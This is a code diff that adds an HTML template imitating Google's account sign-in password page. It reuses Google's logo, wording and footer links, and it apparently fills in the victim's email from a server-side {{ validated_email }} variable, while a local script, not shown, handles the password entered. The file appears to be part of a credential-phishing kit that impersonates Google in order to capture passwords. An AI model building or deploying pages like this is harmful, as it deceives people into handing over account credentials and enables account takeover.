@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Google Accounts</title>
+    <link rel="shortcut icon" href="/static/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href="/static/style/font.css">
+    <link rel="stylesheet" href="/static/style/style.css">
+</head>
+<body>
+    <div class="content">
+        <div class="login">
+            <div class="google-logo">
+                <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+            </div>
+            <div class="form-outer" id="form_password">
+                <div class="sign-in" id="sign-in-password">
+                    <span class="text">Welcome back</span>
+                    <div class="account-chip">
+                        <img src="/static/h-letter.png">
+                        <span class="text" id="account-email">{{ validated_email }}</span>
+                    </div>
+                </div>
+                <div class="form-inner" id="form-inner-password">
+                    <div class="form-input">
+                        <div class="input-container">
+                            <input type="password" class="input-field" name="email__phone" id="email__phone" placeholder=" ">
+                            <label for="email__phone" class="floating-label">Enter your password</label>
+                        </div>
+                        <label class="text" id="show-password-container">
+                            <input type="checkbox" name="show-password" id="show-password">
+                            Show password
+                        </label>
+                    </div>
+                    
+                    <div class="buttons">
+                        <button class="hover-blue">Forgot password?</button>
+                        <button class="blue-button" id="next-password">Next</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer class="google-basic-info">
+            <div class="info-language">
+                <span class="language-current text">English (United States)</span>
+            </div>
+            <div class="info-links">
+                <a target="_blank" rel="noopener noreferrer" href="https://support.google.com/accounts?hl=en&p=account_iph">Help</a>
+                <a target="_blank" rel="noopener noreferrer" href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Privacy</a>
+                <a target="_blank" rel="noopener noreferrer" href="https://accounts.google.com/TOS?loc=US&hl=en">Terms</a>
+            </div>
+        </footer>
+    </div>
+    <script src="/static/js/script.js"></script>
+</body>
+</html>
